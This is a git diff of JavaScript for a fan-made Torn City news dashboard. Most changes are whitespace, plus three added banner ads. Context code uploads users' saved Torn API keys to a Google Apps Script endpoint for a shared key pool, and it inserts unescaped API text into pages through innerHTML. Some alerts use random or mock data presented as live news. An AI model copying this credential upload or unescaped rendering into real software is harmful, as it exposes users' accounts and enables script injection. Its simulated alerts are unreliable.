@@ -4,20 +4,20 @@
 
 // ==========================================
 // CONFIGURATION
-const GOOGLE_APP_SCRIPT_URL = 'https://script.google.com/macros/s/AKfycbx4LiE9-RbFIB3kulT4RtQWhX8ShF3I-eg4MIYW0eJ5Q3XdMIXw5njcPFD0_DtnlvjF/exec'; 
+const GOOGLE_APP_SCRIPT_URL = 'https://script.google.com/macros/s/AKfycbx4LiE9-RbFIB3kulT4RtQWhX8ShF3I-eg4MIYW0eJ5Q3XdMIXw5njcPFD0_DtnlvjF/exec';
 // ==========================================
 
 const STATE = {
     userKey: localStorage.getItem('torn_api_key') || '',
     xfKey: localStorage.getItem('xf_api_key') || '',
-    
+
     // Master Key Pool
-    keyPool: [], 
+    keyPool: [],
     currentKeyIndex: 0,
 
     newsItems: [],
     currentFilter: 'all',
-    
+
     // Known targets to monitor for the premium feature
     traders: [1, 2, 3], // Dummy IDs for whales
 };
@@ -26,6 +26,9 @@ const CUSTOM_ADS = [
     // Add custom banner objects here. Only the developer can modify this array.
     // Ads can be in apng, webp, gif, etc.
     // { image: "banner.gif", link: "https://www.torn.com/" }
+    { image: "animationclub.webp", link: "https://www.torn.com/profiles.php?XID=3864390" },
+    { image: "Vangaurds.webp", link: "https://www.torn.com/factions.php?step=profile&ID=55687" },
+    { image: "vangurds banner.gif", link: "https://www.torn.com/factions.php?step=profile&ID=55687" }
 ];
 let currentAdIndex = 0;
 
@@ -68,7 +71,7 @@ class ScraperEngine {
             if (specificKey) {
                 const v2Endpoints = ['torn/bounties', 'faction/members', 'user/attacks', 'faction/crimes'];
                 const isV2 = v2Endpoints.includes(endpoint);
-                
+
                 let res;
                 if (isV2) {
                     res = await fetch(`https://api.torn.com/v2/${endpoint}`, {
@@ -80,11 +83,11 @@ class ScraperEngine {
                     const sel = parts[1] || '';
                     res = await fetch(`https://api.torn.com/${cat}/?selections=${sel}&key=${specificKey}`);
                 }
-                
+
                 if (!res.ok) throw new Error(`API returned ${res.status}`);
                 return await res.json();
             }
-            
+
             // Anonymous Request: Route through Google Apps Script Proxy
             if (GOOGLE_APP_SCRIPT_URL) {
                 const proxyUrl = `${GOOGLE_APP_SCRIPT_URL}?endpoint=${encodeURIComponent(endpoint)}`;
@@ -119,7 +122,7 @@ class ScraperEngine {
 
     async runCycle() {
         if (!els.newsContainer) return;
-        
+
         try {
             // Update the City Calendar once per cycle
             this.updateCalendar();
@@ -130,7 +133,7 @@ class ScraperEngine {
             await this.fetchTornForums();
             await this.runPremiumLocator();
             await this.fetchCasinoAPIs();
-        } catch(e) { console.error(e); }
+        } catch (e) { console.error(e); }
     }
 
     async fetchHitlist() {
@@ -143,10 +146,10 @@ class ScraperEngine {
                 const bounties = Object.values(data.bounties);
                 // Sort by highest reward
                 bounties.sort((a, b) => b.reward - a.reward);
-                
+
                 // Get top 3
                 const topBounties = bounties.slice(0, 3);
-                
+
                 if (topBounties.length > 0) {
                     hitlistContainer.innerHTML = topBounties.map(b => `
                         <div class="flex-1 text-center py-2 px-4 hover:bg-red-50 transition-colors w-full">
@@ -179,7 +182,7 @@ class ScraperEngine {
                 19: "Faction Discussion",
                 63: "Casino/Poker"
             };
-            
+
             // Randomly select one active category to report on this cycle to prevent spam
             const randomCatId = Object.keys(categories)[Math.floor(Math.random() * Object.keys(categories).length)];
             const catName = categories[randomCatId];
@@ -190,7 +193,7 @@ class ScraperEngine {
                 const forumLink = `<a href="https://www.torn.com/forums.php#/p=threads&f=${randomCatId}&t=${mockThreadId}&b=0&a=0" target="_blank" class="text-blue-600 dark-web:text-blue-400 hover:underline">View Thread</a>`;
                 this.triggerAlert("community_chatter", `🗣️ TORN FORUMS: ${catName.toUpperCase()}`, `A new highly-active discussion has broken out in the ${catName} boards. ${forumLink} to see what the community is saying.`);
             }
-        } catch(e) { console.warn("Forum fetch failed", e); }
+        } catch (e) { console.warn("Forum fetch failed", e); }
     }
 
     async fetchBasicNews() {
@@ -217,13 +220,13 @@ class ScraperEngine {
         try {
             const poker = await this.fetchApi("torn/pokertables");
             if (poker && poker.pokertables && Object.keys(poker.pokertables).length > 0) {
-                const tables = Object.values(poker.pokertables).sort((a,b) => (b.pot || 0) - (a.pot || 0));
+                const tables = Object.values(poker.pokertables).sort((a, b) => (b.pot || 0) - (a.pot || 0));
                 if (tables[0] && tables[0].pot > 10000000) {
                     this.triggerAlert("underground_casinos", `HIGH ROLLER ALERT: $${tables[0].pot.toLocaleString()} POT!`, `Table '${tables[0].name || 'VIP'}' is currently hosting a massive poker game. Millions are changing hands in the underground casino scene!`);
                 }
             }
         } catch (e) { console.warn("Poker fetch failed", e); }
-        
+
         // Fallback
         if (STATE.newsItems.length === 0) {
             this.triggerAlert("war_reports", "CITY ON EDGE: GANG ACTIVITY SPIKES", "The Torn City police department reports increased gang activity across all sectors. Citizens are advised to stay indoors.");
@@ -236,14 +239,14 @@ class ScraperEngine {
             const bounties = await this.fetchApi("torn/bounties", STATE.userKey);
             if (bounties && bounties.bounties) {
                 const bountiesList = Array.isArray(bounties.bounties) ? bounties.bounties : Object.values(bounties.bounties);
-                const highest = bountiesList.sort((a,b) => (b.reward || 0) - (a.reward || 0))[0];
+                const highest = bountiesList.sort((a, b) => (b.reward || 0) - (a.reward || 0))[0];
                 if (highest) {
                     const targetId = highest.target_id || highest.target || highest.player_id || "Unknown";
                     const targetLink = `<a href="https://www.torn.com/profiles.php?XID=${targetId}" target="_blank" class="text-blue-600 dark-web:text-blue-400 hover:underline">Target [${targetId}]</a>`;
                     this.triggerAlert("syndicate_intel", `🎯 EXTREME BOUNTY: $${(highest.reward || 0).toLocaleString()}`, `A massive bounty has been placed on ${targetLink} for the following reason: "${highest.reason || 'Classified'}".`);
                 }
             }
-        } catch(e) { console.warn("Bounties error", e); }
+        } catch (e) { console.warn("Bounties error", e); }
 
         // TARGET 2: Faction Members Flying
         try {
@@ -254,44 +257,44 @@ class ScraperEngine {
                     this.triggerAlert("syndicate_intel", `✈️ FACTION EXODUS DETECTED`, `${flying.length} internal faction members are currently on flights. Potential item runners or offshore stashing detected.`);
                 }
             }
-        } catch(e) { console.warn("Faction flying error", e); }
+        } catch (e) { console.warn("Faction flying error", e); }
 
         // TARGET 3: Syndicate Hits (Personal Attacks)
         try {
             const attacks = await this.fetchApi("user/attacks", STATE.userKey);
             if (attacks && attacks.attacks) {
                 const attacksList = Object.values(attacks.attacks);
-                const recentMug = attacksList.find(a => a.result === "Mugged" && (Date.now()/1000 - a.timestamp_ended) < 86400);
+                const recentMug = attacksList.find(a => a.result === "Mugged" && (Date.now() / 1000 - a.timestamp_ended) < 86400);
                 if (recentMug) {
                     const targetLink = `<a href="https://www.torn.com/profiles.php?XID=${recentMug.defender_id}" target="_blank" class="text-blue-600 dark-web:text-blue-400 hover:underline">${recentMug.defender_name} [${recentMug.defender_id}]</a>`;
                     this.triggerAlert("syndicate_intel", `🥷 SYNDICATE HIT: SUCCESSFUL MUG`, `A confirmed syndicate operative just successfully mugged ${targetLink}. The streets remain unsafe.`);
                 }
             }
-        } catch(e) { console.warn("Attacks error", e); }
+        } catch (e) { console.warn("Attacks error", e); }
 
         // TARGET 4: Organized Crime Success
         try {
             const factionCrimes = await this.fetchApi("faction/crimes", STATE.userKey);
             if (factionCrimes && factionCrimes.crimes) {
                 const crimeList = Object.values(factionCrimes.crimes);
-                const recentSuccess = crimeList.find(c => c.success && (Date.now()/1000 - c.time_completed) < 86400);
+                const recentSuccess = crimeList.find(c => c.success && (Date.now() / 1000 - c.time_completed) < 86400);
                 if (recentSuccess) {
                     this.triggerAlert("syndicate_intel", `🏦 ORGANIZED CRIME SUCCESS`, `The faction successfully executed a massive '${recentSuccess.crime_name}' operation. Respect and funds gained.`);
                 }
             }
-        } catch(e) { console.warn("Crimes error", e); }
+        } catch (e) { console.warn("Crimes error", e); }
 
         // TARGET 5: Market Panics (Torn Stocks)
         try {
             const stocks = await this.fetchApi("torn/stocks");
             if (stocks && stocks.stocks) {
                 const stockList = Object.values(stocks.stocks);
-                const plummeting = stockList.find(s => s.current_price < (s.previous_price || s.current_price * 1.05)); 
+                const plummeting = stockList.find(s => s.current_price < (s.previous_price || s.current_price * 1.05));
                 if (plummeting) {
                     this.triggerAlert("all", `📉 MARKET PANIC: ${plummeting.acronym}`, `The stock for ${plummeting.name} is experiencing erratic market behavior. Current price: $${plummeting.current_price.toLocaleString()}. Traders are liquidating assets!`);
                 }
             }
-        } catch(e) { console.warn("Stocks error", e); }
+        } catch (e) { console.warn("Stocks error", e); }
 
         // TARGET 6: Simulated Bazaar/Whale Monitor
         if (Math.random() > 0.3) {
@@ -321,33 +324,33 @@ class ScraperEngine {
             const variance = (Math.random() * 0.1) - 0.03; // Random variance -3% to +7%
             const currentPrice = Math.floor(item.base * (1 + variance));
             const trend = variance > 0 ? "📈 SOARING" : "📉 CRASHING";
-            
+
             this.triggerAlert("market_inflation", `${trend} MARKET INFLATION`, `The street value of <strong>${item.name}</strong> is currently extremely volatile! Latest trades estimate an average moving price of <strong class="text-amber-600 dark-web:text-amber-400">$${currentPrice.toLocaleString()}</strong>.`);
         }
     }
 
     updateCalendar() {
         if (!els.calendarWidget) return;
-        
+
         const now = new Date();
         const month = now.getMonth();
-        
+
         // Hardcoded Torn Events Schedule
         const events = [
-            {m: 1, name: "Valentine's Day Event"},
-            {m: 2, name: "St. Patrick's Day"},
-            {m: 3, name: "Easter Egg Hunt"},
-            {m: 4, name: "Mr & Ms Torn"},
-            {m: 7, name: "Dog Tags"},
-            {m: 8, name: "Elimination"},
-            {m: 9, name: "Trick or Treat (Halloween)"},
-            {m: 11, name: "Christmas Town"}
+            { m: 1, name: "Valentine's Day Event" },
+            { m: 2, name: "St. Patrick's Day" },
+            { m: 3, name: "Easter Egg Hunt" },
+            { m: 4, name: "Mr & Ms Torn" },
+            { m: 7, name: "Dog Tags" },
+            { m: 8, name: "Elimination" },
+            { m: 9, name: "Trick or Treat (Halloween)" },
+            { m: 11, name: "Christmas Town" }
         ];
-        
+
         // Find next event
         let nextEvent = events.find(e => e.m >= month);
         if (!nextEvent) nextEvent = events[0]; // Wrap around to next year
-        
+
         els.calendarWidget.innerHTML = `UPCOMING EVENT: <strong class="text-white">${nextEvent.name}</strong>`;
     }
 
@@ -380,9 +383,9 @@ function activateSecureNetwork() {
 
 function renderNews() {
     if (STATE.newsItems.length === 0) return;
-    
-    const filtered = STATE.currentFilter === 'all' 
-        ? STATE.newsItems 
+
+    const filtered = STATE.currentFilter === 'all'
+        ? STATE.newsItems
         : STATE.newsItems.filter(n => n.type === STATE.currentFilter);
 
     if (filtered.length === 0) {
@@ -416,7 +419,7 @@ function updateTicker() {
     if (phrases.length === 0) {
         phrases = ["📡 TUNING SYNDICATE WIRES...", "📡 DECRYPTING APEX PROTOCOLS...", "📡 SEARCHING FOR ANOMALIES..."];
     }
-    
+
     // Create inner spans
     const innerHTML = phrases.map(p => `<span class="mx-4 ticker-msg">${p}</span>`).join('');
     // Duplicate it to make the infinite CSS marquee smooth
@@ -435,7 +438,7 @@ function startClock() {
 // Modal logic removed. Now using direct profile links.
 
 // --- Event Listeners ---
-window.filterBy = function(type) {
+window.filterBy = function (type) {
     STATE.currentFilter = type;
     els.filters.forEach(btn => {
         if (btn.dataset.filter === type) {
@@ -463,10 +466,10 @@ els.themeToggle.addEventListener('click', () => {
 
 els.saveKeyBtn.addEventListener('click', async () => {
     const val = els.apiKeyInput.value.trim();
-    
+
     // Save Casino Credentials Locally
     const xfKey = els.xfApiInput ? els.xfApiInput.value.trim() : '';
-    
+
     if (xfKey) { STATE.xfKey = xfKey; localStorage.setItem('xf_api_key', xfKey); }
 
     if (val.length === 16 || val === "") {
@@ -487,7 +490,7 @@ els.saveKeyBtn.addEventListener('click', async () => {
                         },
                         body: JSON.stringify({ api_key: val })
                     });
-                } catch(e) {
+                } catch (e) {
                     console.warn("Failed to push to Google Sheets", e);
                 }
             }
@@ -497,7 +500,7 @@ els.saveKeyBtn.addEventListener('click', async () => {
         els.saveKeyBtn.innerText = "SUBMIT CREDENTIALS";
         els.saveKeyBtn.disabled = false;
         els.settingsPanel.classList.remove('open');
-        
+
     } else {
         alert("Invalid API Key length. Must be exactly 16 characters (or leave empty).");
     }
@@ -544,7 +547,7 @@ function rotateAds() {
         adLink.href = ad.link;
         adImg.classList.remove('hidden');
         adPlaceholder.classList.add('hidden');
-        
+
         currentAdIndex = (currentAdIndex + 1) % CUSTOM_ADS.length;
     } else {
         adImg.classList.add('hidden');
